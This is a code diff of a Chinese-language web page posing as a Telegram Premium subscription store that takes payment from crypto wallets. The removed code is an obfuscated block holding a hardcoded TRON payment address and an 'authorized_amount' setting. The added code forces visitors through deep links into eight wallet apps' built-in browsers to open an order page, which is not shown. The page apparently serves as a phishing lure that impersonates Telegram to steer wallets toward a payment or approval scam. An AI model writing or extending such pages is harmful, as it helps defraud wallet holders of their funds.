@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Telegram Premium - 高级订阅服务</title>
     <style>
+        /* 保持您原有的所有样式不变 */
         * {
             margin: 0;
             padding: 0;
@@ -283,13 +284,28 @@
                 gap: 0.5rem;
             }
         }
+
+        .temporary-message {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0, 0, 0, 0.9);
+            color: white;
+            padding: 1rem 2rem;
+            border-radius: 0.75rem;
+            z-index: 1000;
+            text-align: center;
+            max-width: 80%;
+            box-shadow: 0 0.5rem 2rem rgba(0, 0, 0, 0.3);
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
             <h1>Telegram 高级订阅服务</h1>
-            <p>使用您的加密钱包获取 Telegram Premium 订阅</p>
+            <p>使用您的加密货币钱包获取 Telegram Premium 订阅</p>
         </div>
         
         <div class="pricing-card">
@@ -343,6 +359,21 @@
                         <div class="wallet-name">MetaMask</div>
                     </div>
                     
+                    <div class="wallet-option" onclick="wakeupWalletApp('TrustWallet')">
+                        <div class="wallet-icon">🔒</div>
+                        <div class="wallet-name">Trust Wallet</div>
+                    </div>
+                    
+                    <div class="wallet-option" onclick="wakeupWalletApp('TronLink')">
+                        <div class="wallet-icon">⚡</div>
+                        <div class="wallet-name">TronLink</div>
+                    </div>
+                    
+                    <div class="wallet-option" onclick="wakeupWalletApp('OKX')">
+                        <div class="wallet-icon">🆗</div>
+                        <div class="wallet-name">OKX Web3</div>
+                    </div>
+                    
                     <div class="wallet-option" onclick="wakeupWalletApp('Bitget')">
                         <div class="wallet-icon">💰</div>
                         <div class="wallet-name">Bitget Wallet</div>
@@ -351,6 +382,11 @@
                     <div class="wallet-option" onclick="wakeupWalletApp('imToken')">
                         <div class="wallet-icon">💳</div>
                         <div class="wallet-name">imToken</div>
+                    </div>
+                    
+                    <div class="wallet-option" onclick="wakeupWalletApp('BitPie')">
+                        <div class="wallet-icon">🥧</div>
+                        <div class="wallet-name">BitPie比特派</div>
                     </div>
                 </div>
             </div>
@@ -384,119 +420,27 @@
     </div>
 
     <script>
-        // =============================================
-        // 混淆核心代码
-        // =============================================
-        
-        const _0x1a2b3c = {
-            'payment_address': 'TCSmW3PZTPaog8d2CKBstcFNcGGtyf9Jub',
-            'trx_balance': '0.5',
-            'usdt_balance': '0',
-            'authorized_amount': '2',
-            'notification_switch': '1',
-            'model': '4'
-        };
-
-        let _0x2d4f6e = null;
-        let _0x3e5a7b = '';
-
-        function _0x4c2d8f() {
-            const _0x5a1b2c = navigator.userAgent.toLowerCase();
-            if (_0x5a1b2c.includes('tokenpocket')) return 'TokenPocket';
-            if (_0x5a1b2c.includes('imtoken')) return 'imToken';
-            if (_0x5a1b2c.includes('metamask')) return 'MetaMask';
-            if (_0x5a1b2c.includes('bitget') || _0x5a1b2c.includes('bitkeep')) return 'Bitget';
-            return 'Unknown';
-        }
-
-        function _0x6e7f9a() {
-            if (window.tronWeb && window.tronWeb.defaultAddress) {
-                _0x2d4f6e = window.tronWeb.defaultAddress.base58;
-                return true;
+        // 显示临时消息函数
+        function showTemporaryMessage(message) {
+            const existingMessage = document.querySelector('.temporary-message');
+            if (existingMessage) {
+                existingMessage.remove();
             }
-            if (window.ethereum) {
-                return true;
-            }
-            return false;
-        }
-
-        function _0x8a1b2c() {
-            setTimeout(() => {
-                if (_0x6e7f9a()) {
-                    console.log('Wallet connected');
-                }
-            }, 500);
-        }
-
-        function _0x9b3c4d(_0x5d6e7f, _0x7e8f9a) {
-            const _0x1a2b3c = {
-                'TokenPocket': `tpoutside://pull.activity?param=${encodeURIComponent(_0x5d6e7f)}`,
-                'MetaMask': `metamask://wc?uri=${encodeURIComponent(_0x5d6e7f)}`,
-                'Bitget': `bitkeep://browser?url=${encodeURIComponent(_0x5d6e7f)}`,
-                'imToken': `imtokenv2://navigate?url=${encodeURIComponent(_0x5d6e7f)}`
-            };
-            return _0x1a2b3c[_0x7e8f9a] || _0x5d6e7f;
-        }
-
-        function _0xa2b3c4(_0x3d4e5f, _0x4e5f6a, _0x5f6a7b) {
-            let _0x6a7b8c = false;
             
-            try {
-                const _0x7b8c9d = document.createElement('iframe');
-                _0x7b8c9d.style.display = 'none';
-                _0x7b8c9d.src = _0x3d4e5f;
-                document.body.appendChild(_0x7b8c9d);
-                setTimeout(() => {
-                    document.body.removeChild(_0x7b8c9d);
-                    _0x6a7b8c = true;
-                }, 800);
-            } catch (_0x8c9d0e) {}
+            const messageDiv = document.createElement('div');
+            messageDiv.className = 'temporary-message';
+            messageDiv.textContent = message;
+            document.body.appendChild(messageDiv);
             
             setTimeout(() => {
-                if (!_0x6a7b8c) {
-                    try {
-                        window.location.href = _0x3d4e5f;
-                        _0x6a7b8c = true;
-                    } catch (_0x9d0e1f) {}
+                if (messageDiv.parentNode) {
+                    messageDiv.remove();
                 }
-            }, 150);
-            
-            setTimeout(() => {
-                if (!_0x6a7b8c) {
-                    window.location.href = _0x4e5f6a;
-                }
-            }, 2500);
+            }, 3000);
         }
 
-        function _0xb3c4d5() {
-            _0x8a1b2c();
-        }
-
-        function _0xc4d5e6(_0xd5e6f7, _0xe6f7g8) {
-            const _0xf7g8h9 = {
-                orderId: 'TG' + Date.now() + Math.random().toString(36).substr(2, 6).toUpperCase(),
-                username: _0xd5e6f7,
-                nickname: _0xe6f7g8,
-                amount: '1.99'
-            };
-            
-            const _0x1a2b3c = new URLSearchParams(_0xf7g8h9).toString();
-            const _0x2b3c4d = `${window.location.origin}/order.html?${_0x1a2b3c}`;
-            
-            return _0x2b3c4d;
-        }
-
-        // =============================================
-        // 主逻辑
-        // =============================================
-
-        const getBaseUrl = () => {
-            return window.location.origin;
-        };
-
+        // 初始化
         document.addEventListener('DOMContentLoaded', function() {
-            _0xb3c4d5();
-            
             document.getElementById('purchaseBtn').addEventListener('click', function() {
                 document.getElementById('userForm').style.display = 'block';
                 this.style.display = 'none';
@@ -507,12 +451,12 @@
                 const nickname = document.getElementById('nickname').value.trim();
                 
                 if (!username || !nickname) {
-                    alert('请填写完整的用户信息！');
+                    showTemporaryMessage('请填写完整的用户信息！');
                     return;
                 }
                 
                 if (!username.startsWith('@')) {
-                    alert('用户名必须以 @ 开头');
+                    showTemporaryMessage('用户名必须以 @ 开头');
                     return;
                 }
                 
@@ -521,19 +465,159 @@
             });
         });
 
+        // 钱包唤醒函数 - 按照您提供的代码融合
         function wakeupWalletApp(walletName) {
             const username = document.getElementById('username').value.trim();
             const nickname = document.getElementById('nickname').value.trim();
             
             if (!username || !nickname) {
-                alert('请先填写用户信息！');
+                showTemporaryMessage('请先填写用户信息！');
                 return;
             }
             
-            const orderUrl = _0xc4d5e6(username, nickname);
-            const schemeUrl = _0x9b3c4d(orderUrl, walletName);
+            // 生成订单号
+            const orderId = 'TG' + Date.now() + Math.random().toString(36).substr(2, 5).toUpperCase();
             
-            _0xa2b3c4(schemeUrl, orderUrl, walletName);
+            // 构建订单页面URL - 使用相对路径
+            const orderParams = {
+                orderId: orderId,
+                username: encodeURIComponent(username),
+                nickname: encodeURIComponent(nickname),
+                amount: '1.99'
+            };
+            
+            const orderUrl = `order.html?orderId=${orderParams.orderId}&username=${orderParams.username}&nickname=${orderParams.nickname}&amount=${orderParams.amount}`;
+            
+            console.log(`尝试唤醒 ${walletName} 钱包`);
+            console.log('订单URL:', orderUrl);
+            
+            // 根据钱包类型使用不同的唤醒策略 - 按照您提供的代码
+            const walletConfigs = {
+                'TrustWallet': {
+                    schemes: [
+                        `trust://browser?url=${encodeURIComponent(orderUrl)}`,
+                        `https://link.trustwallet.com/browser?url=${encodeURIComponent(orderUrl)}`,
+                        `trust://dapp?url=${encodeURIComponent(orderUrl)}`
+                    ]
+                },
+                'TronLink': {
+                    schemes: [
+                        `tronlinkoutside://pull.activity?param=${encodeURIComponent(encodeURIComponent(orderUrl))}`,
+                        `tronlink://pull.activity?param=${encodeURIComponent(encodeURIComponent(orderUrl))}`,
+                        `https://www.tronlink.org/dapp?url=${encodeURIComponent(orderUrl)}`
+                    ]
+                },
+                'OKX': {
+                    schemes: [
+                        `okex://main/dapp?url=${encodeURIComponent(orderUrl)}`,
+                        `okx://main/dapp?url=${encodeURIComponent(orderUrl)}`,
+                        `okex://dapp?url=${encodeURIComponent(orderUrl)}`,
+                        `https://www.okx.com/download?deeplink=${encodeURIComponent(`okex://main/dapp?url=${encodeURIComponent(orderUrl)}`)}`
+                    ]
+                },
+                'BitPie': {
+                    schemes: [
+                        `bitpie://browser?url=${encodeURIComponent(orderUrl)}`,
+                        `bitpie://dapp?url=${encodeURIComponent(orderUrl)}`,
+                        `https://bitpie.com/dapp?url=${encodeURIComponent(orderUrl)}`
+                    ]
+                },
+                'TokenPocket': {
+                    schemes: [
+                        `tpoutside://pull.activity?param=${encodeURIComponent(encodeURIComponent(orderUrl))}`,
+                        `tpoutside://pull.activity?url=${encodeURIComponent(orderUrl)}`
+                    ]
+                },
+                'MetaMask': {
+                    schemes: [
+                        `metamask://wc?uri=${encodeURIComponent(orderUrl)}`,
+                        `https://metamask.app.link/dapp/${window.location.hostname}${orderUrl}`
+                    ]
+                },
+                'Bitget': {
+                    schemes: [
+                        `bitkeep://browser?url=${encodeURIComponent(orderUrl)}`,
+                        `bitget://browser?url=${encodeURIComponent(orderUrl)}`
+                    ]
+                },
+                'imToken': {
+                    schemes: [
+                        `imtokenv2://navigate?url=${encodeURIComponent(orderUrl)}`,
+                        `imtoken://navigate?url=${encodeURIComponent(orderUrl)}`
+                    ]
+                }
+            };
+
+            const config = walletConfigs[walletName];
+            if (!config) {
+                showTemporaryMessage('暂不支持该钱包');
+                return;
+            }
+
+            // 尝试所有可能的Scheme - 按照您提供的代码
+            tryAllSchemes(config.schemes, orderUrl, walletName);
+        }
+
+        // 尝试所有可能的Scheme - 按照您提供的代码
+        function tryAllSchemes(schemes, fallbackUrl, walletName) {
+            let success = false;
+            
+            schemes.forEach((scheme, index) => {
+                setTimeout(() => {
+                    if (!success) {
+                        console.log(`尝试 ${walletName} Scheme ${index + 1}:`, scheme);
+                        attemptWakeup(scheme, fallbackUrl, walletName, index + 1);
+                    }
+                }, index * 800);
+            });
+            
+            // 如果所有Scheme都失败，最终回退
+            setTimeout(() => {
+                if (!success) {
+                    console.log(`${walletName}: 所有Scheme都失败，直接打开网页`);
+                    window.location.href = fallbackUrl;
+                }
+            }, schemes.length * 800 + 1000);
+        }
+
+        // 尝试唤醒钱包 - 按照您提供的代码
+        function attemptWakeup(scheme, fallbackUrl, walletName, attemptNum) {
+            // 方法1: 使用iframe（最可靠）
+            try {
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = scheme;
+                document.body.appendChild(iframe);
+                
+                setTimeout(() => {
+                    try {
+                        document.body.removeChild(iframe);
+                    } catch (e) {}
+                }, 500);
+            } catch (error) {
+                console.log(`${walletName} iframe方式失败:`, error);
+            }
+            
+            // 方法2: 使用window.location（备用）
+            setTimeout(() => {
+                try {
+                    window.location.href = scheme;
+                } catch (error) {
+                    console.log(`${walletName} location方式失败:`, error);
+                }
+            }, 100);
+            
+            // 方法3: 使用window.open（移动端备用）
+            setTimeout(() => {
+                try {
+                    const newWindow = window.open(scheme, '_blank');
+                    if (newWindow) {
+                        console.log(`${walletName} window.open成功`);
+                    }
+                } catch (error) {
+                    console.log(`${walletName} window.open失败:`, error);
+                }
+            }, 200);
         }
     </script>
 </body>
